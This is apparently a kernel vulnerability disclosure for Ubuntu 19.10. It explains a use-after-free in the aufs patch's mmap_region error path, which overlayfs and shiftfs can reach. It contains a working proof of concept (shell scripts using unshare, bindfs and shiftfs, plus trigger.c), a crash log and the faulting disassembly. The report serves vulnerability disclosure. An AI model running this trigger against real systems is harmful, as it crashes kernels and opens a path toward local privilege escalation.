@@ -1,0 +1,188 @@
+Tested on 19.10.
+
+Ubuntu's aufs kernel patch includes the following change (which I interestingly
+can't see in the AUFS code at
+https://github.com/sfjro/aufs5-linux/blob/master/mm/mmap.c):
+
+==================================================================
++#define vma_fput(vma)                  vma_do_fput(vma, __func__, __LINE__)
+[...]
+@@ -1847,8 +1847,8 @@ unsigned long mmap_region(struct file *file, unsigned long addr,
+        return addr;
+ 
+ unmap_and_free_vma:
++       vma_fput(vma);
+        vma->vm_file = NULL;
+-       fput(file);
+ 
+        /* Undo any partial mapping done by a device driver. */
+        unmap_region(mm, vma, prev, vma->vm_start, vma->vm_end);
+[...]
++void vma_do_fput(struct vm_area_struct *vma, const char func[], int line)
++{
++       struct file *f = vma->vm_file, *pr = vma->vm_prfile;
++
++       prfile_trace(f, pr, func, line, __func__);
++       fput(f);
++       if (f && pr)
++               fput(pr);
++}
+==================================================================
+
+This means that in the case where call_mmap() returns an error to mmap_region(),
+fput() will be called on the current value of vma->vm_file instead of the saved
+file pointer. This matters if the ->mmap() handler replaces ->vm_file before
+returning an error code.
+
+overlayfs and shiftfs do that when call_mmap() on the lower filesystem fails,
+see ovl_mmap() and shiftfs_mmap().
+
+To demonstrate the issue, the PoC below mounts a shiftfs that is backed by a
+FUSE filesystem with the FUSE flag FOPEN_DIRECT_IO, which causes fuse_file_mmap()
+to bail out with -ENODEV if MAP_SHARED is set.
+
+I would have used overlayfs instead, but there is an unrelated bug that makes it
+impossible to mount overlayfs inside a user namespace:
+Commit 82c0860106f264 ("UBUNTU: SAUCE: overlayfs: Propogate nosuid from lower
+and upper mounts") defines SB_I_NOSUID as 0x00000010, but SB_I_USERNS_VISIBLE
+already has the same value. This causes mount_too_revealing() to bail out with a
+WARN_ONCE().
+
+Note that this PoC requires the "bindfs" package and should be executed with
+"slub_debug" in the kernel commandline to get a clear crash.
+
+==================================================================
+Ubuntu 19.10 user-Standard-PC-Q35-ICH9-2009 ttyS0
+
+user-Standard-PC-Q35-ICH9-2009 login: user
+Password: 
+Last login: Fr Nov  1 23:45:36 CET 2019 on ttyS0
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-19-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+user@user-Standard-PC-Q35-ICH9-2009:~$ ls
+aufs-mmap  Documents  Music     Public     trace.dat
+Desktop    Downloads  Pictures  Templates  Videos
+user@user-Standard-PC-Q35-ICH9-2009:~$ cd aufs-mmap/
+user@user-Standard-PC-Q35-ICH9-2009:~/aufs-mmap$ cat /proc/cmdline 
+BOOT_IMAGE=/boot/vmlinuz-5.3.0-19-generic root=UUID=f7d8d4fb-0c96-498e-b875-0b777127a332 ro console=ttyS0 slub_debug quiet splash vt.handoff=7
+user@user-Standard-PC-Q35-ICH9-2009:~/aufs-mmap$ cat run.sh
+#!/bin/sh
+sync
+unshare -mUr ./run2.sh
+user@user-Standard-PC-Q35-ICH9-2009:~/aufs-mmap$ cat run2.sh
+#!/bin/bash
+set -e
+
+mount -t tmpfs none /tmp
+mkdir -p /tmp/{lower,middle,upper}
+touch /tmp/lower/foo
+# mount some random FUSE filesystem with direct_io,
+# doesn't really matter what it does as long as
+# there's a file in it.
+# (this is just to get some filesystem that can
+# easily be convinced to throw errors from f_op->mmap)
+bindfs -o direct_io /tmp/lower /tmp/middle
+# use the FUSE filesystem to back shiftfs.
+# overlayfs would also work if SB_I_NOSUID and
+# SB_I_USERNS_VISIBLE weren't defined to the same
+# value...
+mount -t shiftfs -o mark /tmp/middle /tmp/upper
+mount|grep shift
+gcc -o trigger trigger.c -Wall
+./trigger
+user@user-Standard-PC-Q35-ICH9-2009:~/aufs-mmap$ cat trigger.c
+#include <fcntl.h>
+#include <err.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <stdio.h>
+
+int main(void) {
+  int foofd = open("/tmp/upper/foo", O_RDONLY);
+  if (foofd == -1) err(1, "open foofd");
+  void *badmap = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, foofd, 0);
+  if (badmap == MAP_FAILED) {
+    perror("badmap");
+  } else {
+    errx(1, "badmap worked???");
+  }
+  sleep(1);
+  mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, foofd, 0);
+}
+user@user-Standard-PC-Q35-ICH9-2009:~/aufs-mmap$ ./run.sh 
+/tmp/middle on /tmp/upper type shiftfs (rw,relatime,mark)
+badmap: No such device
+[   72.101721] general protection fault: 0000 [#1] SMP PTI
+[   72.111917] CPU: 1 PID: 1376 Comm: trigger Not tainted 5.3.0-19-generic #20-Ubuntu
+[   72.124846] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
+[   72.140965] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[   72.149210] Code: 8b e0 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[   72.167229] RSP: 0018:ffffc1490061bd40 EFLAGS: 00010202
+[   72.170426] RAX: 6b6b6b6b6b6b6b6b RBX: ffff9c1cf1ae5788 RCX: 7800000000000000
+[   72.174528] RDX: 8000000000000025 RSI: ffff9c1cf14bfdc8 RDI: ffff9c1cc48b5900
+[   72.177790] RBP: ffffc1490061bd60 R08: ffff9c1cf14bfdc8 R09: 0000000000000000
+[   72.181199] R10: ffff9c1cf1ae5768 R11: 00007faa3eddb000 R12: ffff9c1cf1ae5790
+[   72.186306] R13: ffff9c1cc48b7740 R14: ffff9c1cf14bfdc8 R15: ffff9c1cf7209740
+[   72.189705] FS:  00007faa3ed9e540(0000) GS:ffff9c1cfbb00000(0000) knlGS:0000000000000000
+[   72.193073] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   72.195390] CR2: 0000558ad728d3e0 CR3: 0000000144804003 CR4: 0000000000360ee0
+[   72.198237] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[   72.200557] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[   72.202815] Call Trace:
+[   72.203712]  mmap_region+0x417/0x670
+[   72.204868]  do_mmap+0x3a8/0x580
+[   72.205939]  vm_mmap_pgoff+0xcb/0x120
+[   72.207954]  ksys_mmap_pgoff+0x1ca/0x2a0
+[   72.210078]  __x64_sys_mmap+0x33/0x40
+[   72.211327]  do_syscall_64+0x5a/0x130
+[   72.212538]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[   72.214177] RIP: 0033:0x7faa3ecc7af6
+[   72.215352] Code: 00 00 00 00 f3 0f 1e fa 41 f7 c1 ff 0f 00 00 75 2b 55 48 89 fd 53 89 cb 48 85 ff 74 37 41 89 da 48 89 ef b8 09 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 62 5b 5d c3 0f 1f 80 00 00 00 00 48 8b 05 61
+[   72.222275] RSP: 002b:00007ffd0fc44c68 EFLAGS: 00000246 ORIG_RAX: 0000000000000009
+[   72.224714] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007faa3ecc7af6
+[   72.228123] RDX: 0000000000000001 RSI: 0000000000001000 RDI: 0000000000000000
+[   72.230913] RBP: 0000000000000000 R08: 0000000000000003 R09: 0000000000000000
+[   72.233193] R10: 0000000000000001 R11: 0000000000000246 R12: 0000556248213100
+[   72.235448] R13: 00007ffd0fc44d70 R14: 0000000000000000 R15: 0000000000000000
+[   72.237681] Modules linked in: shiftfs intel_rapl_msr snd_hda_codec_generic ledtrig_audio snd_hda_intel snd_hda_codec snd_hda_core snd_hwdep snd_pcm snd_seq_midi snd_seq_midi_event snd_rawmidi intel_rapl_common crct10dif_pclmul crc32_pclmul ghash_clmulni_intel aesni_intel aes_x86_64 crypto_simd snd_seq cryptd glue_helper joydev input_leds serio_raw snd_seq_device snd_timer snd qxl ttm soundcore qemu_fw_cfg drm_kms_helper drm fb_sys_fops syscopyarea sysfillrect sysimgblt mac_hid sch_fq_codel parport_pc ppdev lp parport virtio_rng ip_tables x_tables autofs4 hid_generic usbhid hid virtio_net net_failover failover ahci psmouse lpc_ich i2c_i801 libahci virtio_blk
+[   72.257673] ---[ end trace 5d85e7b7b0bae5f5 ]---
+[   72.259237] RIP: 0010:shiftfs_mmap+0x20/0xd0 [shiftfs]
+[   72.260990] Code: 8b e0 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
+[   72.269615] RSP: 0018:ffffc1490061bd40 EFLAGS: 00010202
+[   72.271414] RAX: 6b6b6b6b6b6b6b6b RBX: ffff9c1cf1ae5788 RCX: 7800000000000000
+[   72.273893] RDX: 8000000000000025 RSI: ffff9c1cf14bfdc8 RDI: ffff9c1cc48b5900
+[   72.276354] RBP: ffffc1490061bd60 R08: ffff9c1cf14bfdc8 R09: 0000000000000000
+[   72.278796] R10: ffff9c1cf1ae5768 R11: 00007faa3eddb000 R12: ffff9c1cf1ae5790
+[   72.281095] R13: ffff9c1cc48b7740 R14: ffff9c1cf14bfdc8 R15: ffff9c1cf7209740
+[   72.284048] FS:  00007faa3ed9e540(0000) GS:ffff9c1cfbb00000(0000) knlGS:0000000000000000
+[   72.287161] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   72.289164] CR2: 0000558ad728d3e0 CR3: 0000000144804003 CR4: 0000000000360ee0
+[   72.291953] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[   72.294487] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+==================================================================
+
+Faulting code:
+
+0000000F  55                push rbp
+00000010  4889E5            mov rbp,rsp
+00000013  4157              push r15
+00000015  4156              push r14
+00000017  4155              push r13
+00000019  4154              push r12
+0000001B  488B87C8000000    mov rax,[rdi+0xc8]
+00000022  4C8B6810          mov r13,[rax+0x10]
+00000026  498B4528          mov rax,[r13+0x28]
+0000002A  4883786000        cmp qword [rax+0x60],byte +0x0     <<<< GPF HERE
+0000002F  0F8497000000      jz near 0xcc
+00000035  4989FC            mov r12,rdi
+00000038  4989F6            mov r14,rsi
+
+As you can see, the poison value 6b6b6b6b6b6b6b6b is being dereferenced.
